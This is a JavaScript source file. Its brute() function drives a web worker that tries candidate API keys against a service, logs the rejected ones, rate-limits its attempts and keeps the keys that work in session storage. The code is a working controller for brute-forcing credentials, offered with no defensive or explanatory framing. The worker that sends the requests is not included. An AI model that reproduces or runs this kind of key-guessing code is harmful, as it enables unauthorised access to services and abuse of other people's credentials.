function brute()
{
  //$("button")[1].click();
  var testedKeys = JSON.parse(sessionStorage.getItem("testedKeys")) || {};

  console.log("Starting worker...");
  var worker = new Worker("bruteWorker.js");

  worker.onmessage = function(event)
  {
    if (event.data.msg.indexOf("Bad API key") > 0)
    {
      console.log("Bad API key.");
      testedKeys[event.data.key] = null; // bad API key

      if (event.data.num <= 0) {
        console.log("All done.");
        worker.terminate();
        return;
      }

      sleep(1250).then( () => {
        worker.postMessage({msg: "Hello", num: --event.data.num});
        console.log("Worker num left: ",  event.data.num);
      });

    }
    else {
      console.log("Found API key!", event.data.msg);
      testedKeys[event.data.key] = true;

      //for (let key in testedKeys)
      //  if (key) console.log(key);

      var workingKeys = Object.keys(testedKeys).filter( key => testedKeys[key] !== null );
      var noneworkingKeys = Object.keys(testedKeys).length - workingKeys.length;
      console.log("Total keys ", Object.keys(testedKeys).length);
      console.log("Noneworking keys: " + noneworkingKeys,
                  "Working:", workingKeys);
    }

    sessionStorage.setItem("testedKeys", JSON.stringify(testedKeys));
  };

  worker.postMessage({msg: "Hello", num: 10});


  /*
  for(let i = 0; i<10; i++) {
      //console.log(i);
      if ($("tbody tr") &&
          $("tbody tr")[0] &&
          $("tbody tr")[0].nodeName == "TR")
            break;
  }*/
  return "Init complete.";
}
